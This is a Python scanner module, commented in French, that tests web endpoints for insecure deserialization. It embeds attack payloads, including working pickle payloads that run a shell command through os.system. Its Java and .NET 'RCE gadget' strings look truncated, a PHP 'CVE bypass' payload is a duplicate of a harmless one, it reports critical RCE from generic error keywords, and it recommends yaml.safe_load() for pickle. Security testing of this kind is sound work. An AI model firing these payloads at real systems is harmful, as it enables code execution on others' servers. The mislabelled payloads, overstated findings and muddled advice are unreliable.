"""
Détecteur de vulnérabilités Deserialization
Java, Python, PHP, .NET, Ruby, Node.js
"""

import asyncio
import base64
from typing import Optional, List, Dict
from loguru import logger
import aiohttp

from core.models import Vulnerabilite


class DetecteurDeserialization:
    """
    Détecte les vulnérabilités Insecure Deserialization
    Supporte: Java (ObjectInputStream), Python (pickle), PHP (unserialize),
              .NET (BinaryFormatter), Ruby (Marshal), Node.js (node-serialize)
    """

    def __init__(self, auth_config: Dict = None):
        """
        Initialise le détecteur
        
        Args:
            auth_config: Configuration d'authentification
        """
        self.auth_config = auth_config or {}
        
        # Magic bytes pour détection de sérialization
        self.magic_bytes = {
            'Java': [
                b'\xac\xed\x00\x05',  # Java serialization magic
                'rO0AB',  # Base64 de \xac\xed\x00\x05
            ],
            'Python': [
                b'\x80\x04',  # Pickle protocol 4
                b'\x80\x03',  # Pickle protocol 3
                b'\x80\x02',  # Pickle protocol 2
                'gASV',  # Base64 pickle
            ],
            'PHP': [
                b'O:',  # PHP object serialization
                b'a:',  # PHP array serialization
                b'C:',  # PHP custom serialized
            ],
            '.NET': [
                b'\x00\x01\x00\x00\x00\xff\xff\xff\xff',  # BinaryFormatter
            ],
            'Ruby': [
                b'\x04\x08',  # Ruby Marshal format
            ],
        }
        
        # Payloads Java (ysoserial-inspired)
        self.payloads_java = [
            # CommonsCollections1 (RCE)
            'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb21wYXJhdG9ycy5UcmFuc2Zvcm1pbmdDb21wYXJhdG9y',
            
            # CommonsCollections6
            'rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQ==',
            
            # Spring Framework gadget
            'rO0ABXNyAB1vcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuaW8=',
        ]
        
        # Payloads Python pickle (malicious)
        self.payloads_python = [
            # Pickle RCE via os.system
            base64.b64encode(
                b'\x80\x04\x95.\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
            ).decode(),
            
            # Pickle with __reduce__
            'gASVKAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==',
        ]
        
        # Payloads PHP
        self.payloads_php = [
            # PHP Object Injection
            'O:8:"stdClass":1:{s:4:"test";s:3:"abc";}',
            
            # PHP POP chain simulation
            'O:11:"PDOStatement":0:{}',
            
            # __wakeup bypass (CVE-2016-7124)
            'O:8:"stdClass":1:{s:4:"test";s:3:"abc";}',
        ]
        
        # Payloads .NET
        self.payloads_dotnet = [
            # BinaryFormatter RCE
            '/wEyxBEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy',
        ]

    async def detecter(self, url: str, params: Dict = None) -> List[Vulnerabilite]:
        """
        Détecte les vulnérabilités de désérialisation
        
        Args:
            url: URL à tester
            params: Paramètres découverts
            
        Returns:
            List[Vulnerabilite]: Vulnérabilités trouvées
        """
        vulnerabilites = []
        
        logger.info(f"🔍 Test Deserialization: {url}")
        
        try:
            async with aiohttp.ClientSession(
                cookies=self.auth_config.get('cookies'),
                headers=self.auth_config.get('headers')
            ) as session:
                # Test 1: Détecter la présence de sérialisation dans les réponses
                vuln_passive = await self._detecter_serialization_passive(session, url)
                if vuln_passive:
                    vulnerabilites.append(vuln_passive)
                
                # Test 2: Tester les payloads actifs si paramètres disponibles
                if params:
                    for param_name in params.keys():
                        # Java
                        java_vulns = await self._test_java_deserialization(
                            session, url, param_name, params
                        )
                        vulnerabilites.extend(java_vulns)
                        
                        # Python
                        python_vulns = await self._test_python_deserialization(
                            session, url, param_name, params
                        )
                        vulnerabilites.extend(python_vulns)
                        
                        # PHP
                        php_vulns = await self._test_php_deserialization(
                            session, url, param_name, params
                        )
                        vulnerabilites.extend(php_vulns)
                        
                        await asyncio.sleep(0.1)
        
        except Exception as e:
            logger.debug(f"Erreur test Deserialization: {str(e)}")
        
        return vulnerabilites

    async def _detecter_serialization_passive(
        self, session: aiohttp.ClientSession, url: str
    ) -> Optional[Vulnerabilite]:
        """
        Détection passive de sérialisation dans les réponses/cookies
        """
        try:
            async with session.get(
                url,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                # Vérifier les cookies
                for cookie_name, cookie in response.cookies.items():
                    cookie_value = cookie.value
                    
                    # Détecter magic bytes
                    for lang, magic_list in self.magic_bytes.items():
                        for magic in magic_list:
                            if isinstance(magic, bytes):
                                try:
                                    decoded = base64.b64decode(cookie_value)
                                    if decoded.startswith(magic):
                                        return Vulnerabilite(
                                            type="Deserialization_Detection",
                                            severite="HAUTE",
                                            url=url,
                                            description=f"Cookie '{cookie_name}' contient des données sérialisées ({lang}). Potentiel risque de désérialisation non sécurisée.",
                                            payload=f"Cookie: {cookie_name}={cookie_value[:50]}...",
                                            preuve=f"Magic bytes {lang} détectés: {magic.hex()}",
                                            cvss_score=8.0,
                                            remediation=self._get_remediation_deserialization(lang)
                                        )
                                except Exception:
                                    pass
                            elif isinstance(magic, str) and magic in cookie_value:
                                return Vulnerabilite(
                                    type="Deserialization_Detection",
                                    severite="HAUTE",
                                    url=url,
                                    description=f"Cookie '{cookie_name}' contient des données sérialisées ({lang})",
                                    payload=f"Cookie: {cookie_name}",
                                    preuve=f"Pattern {lang} détecté",
                                    cvss_score=8.0,
                                    remediation=self._get_remediation_deserialization(lang)
                                )
        
        except Exception as e:
            logger.debug(f"Erreur détection passive: {str(e)}")
        
        return None

    async def _test_java_deserialization(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        params: Dict
    ) -> List[Vulnerabilite]:
        """Teste les payloads Java deserialization"""
        vulnerabilites = []
        
        for payload in self.payloads_java:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                # Test POST avec cookie aussi
                cookies = {param_name: payload}
                
                async with session.post(
                    url,
                    data=test_params,
                    cookies=cookies,
                    timeout=aiohttp.ClientTimeout(total=15)
                ) as response:
                    contenu = await response.text()
                    
                    # Indicateurs de Java deserialization RCE
                    java_indicators = [
                        'java.io.ObjectInputStream',
                        'java.lang.ClassNotFoundException',
                        'InvalidClassException',
                        'StreamCorruptedException',
                        'ysoserial',
                        'commons-collections',
                        'JNDI',
                        'InitialContext'
                    ]
                    
                    if any(ind in contenu for ind in java_indicators):
                        vulnerabilites.append(
                            Vulnerabilite(
                                type="Java_Deserialization",
                                severite="CRITIQUE",
                                url=url,
                                description=f"Java Deserialization RCE via '{param_name}'. Permet l'exécution de code arbitraire (ysoserial gadget chains).",
                                payload=f"{param_name}={payload[:50]}...",
                                preuve=contenu[:500],
                                cvss_score=10.0,
                                remediation=self._get_remediation_deserialization('Java')
                            )
                        )
                        logger.success(f"✅ Java Deserialization trouvé: {param_name}")
                        break
            
            except Exception:
                continue
        
        return vulnerabilites

    async def _test_python_deserialization(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        params: Dict
    ) -> List[Vulnerabilite]:
        """Teste les payloads Python pickle"""
        vulnerabilites = []
        
        for payload in self.payloads_python:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                async with session.post(
                    url,
                    data=test_params,
                    timeout=aiohttp.ClientTimeout(total=15)
                ) as response:
                    contenu = await response.text()
                    
                    # Indicateurs pickle RCE
                    pickle_indicators = [
                        'pickle',
                        'uid=',
                        'gid=',
                        '__reduce__',
                        'GLOBAL',
                        'UnpicklingError'
                    ]
                    
                    if any(ind in contenu for ind in pickle_indicators):
                        vulnerabilites.append(
                            Vulnerabilite(
                                type="Python_Deserialization",
                                severite="CRITIQUE",
                                url=url,
                                description=f"Python Pickle Deserialization RCE via '{param_name}'",
                                payload=f"{param_name}={payload[:50]}...",
                                preuve=contenu[:500],
                                cvss_score=10.0,
                                remediation=self._get_remediation_deserialization('Python')
                            )
                        )
                        logger.success(f"✅ Python Pickle Deserialization trouvé: {param_name}")
                        break
            
            except Exception:
                continue
        
        return vulnerabilites

    async def _test_php_deserialization(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        params: Dict
    ) -> List[Vulnerabilite]:
        """Teste les payloads PHP unserialize"""
        vulnerabilites = []
        
        for payload in self.payloads_php:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                async with session.post(
                    url,
                    data=test_params,
                    timeout=aiohttp.ClientTimeout(total=15)
                ) as response:
                    contenu = await response.text()
                    
                    # Indicateurs PHP deserialization
                    php_indicators = [
                        'unserialize',
                        '__wakeup',
                        '__destruct',
                        'Notice: unserialize',
                        'POP chain',
                        'stdClass'
                    ]
                    
                    if any(ind in contenu for ind in php_indicators):
                        vulnerabilites.append(
                            Vulnerabilite(
                                type="PHP_Deserialization",
                                severite="CRITIQUE",
                                url=url,
                                description=f"PHP Object Injection via '{param_name}'. POP chain exploitation possible.",
                                payload=f"{param_name}={payload}",
                                preuve=contenu[:500],
                                cvss_score=9.5,
                                remediation=self._get_remediation_deserialization('PHP')
                            )
                        )
                        logger.success(f"✅ PHP Deserialization trouvé: {param_name}")
                        break
            
            except Exception:
                continue
        
        return vulnerabilites

    def _get_remediation_deserialization(self, lang: str) -> str:
        """Recommandations de remediation par langage"""
        
        base = f"""
Remediation Deserialization ({lang}):

1. NE JAMAIS désérialiser de données non fiables
2. Utiliser des formats de données sûrs (JSON, XML avec validation)
3. Implémenter une signature cryptographique (HMAC) des données sérialisées
4. Whitelist stricte des classes désérialisables
5. Mettre à jour toutes les bibliothèques vers versions sécurisées
6. Isoler le code de désérialisation avec sandboxing
7. Monitoring et logs des tentatives de désérialisation
8. Principe du moindre privilège pour l'application
9. WAF avec règles anti-deserialization
10. Tests de sécurité réguliers

Spécifique {lang}:
"""
        
        specifics = {
            'Java': """
- Utiliser ObjectInputFilter (Java 9+) pour whitelist
- Éviter ObjectInputStream, utiliser JSON à la place
- SerializationFilter avec @Serial annotations
- Désactiver JMX/RMI si non utilisés
- Mettre à jour Commons-Collections, Spring, etc.
- Scanner avec ysoserial pour gadget chains
""",
            'Python': """
- NE JAMAIS utiliser pickle pour données non fiables
- Utiliser JSON, MessagePack, ou Protocol Buffers
- Si pickle nécessaire: yaml.safe_load() avec restrictions
- Sandboxing avec RestrictedPython
- Signature HMAC des pickles
""",
            'PHP': """
- Utiliser json_encode/json_decode au lieu de serialize/unserialize
- Si unserialize nécessaire: implémenter __wakeup vide
- Mettre à jour vers PHP 7.4+ avec typed properties
- Bloquer phar:// wrapper
- Scanner pour POP chains connues
"""
        }
        
        return base + specifics.get(lang, "")


# Test
async def test_deserialization():
    """Test du détecteur"""
    detector = DetecteurDeserialization()
    test_url = "http://localhost:8080/deserialize"
    test_params = {'data': 'test'}
    
    vulns = await detector.detecter(test_url, test_params)
    print(f"{'✅' if vulns else '❌'} {len(vulns)} vulnérabilités Deserialization trouvées")


if __name__ == "__main__":
    asyncio.run(test_deserialization())
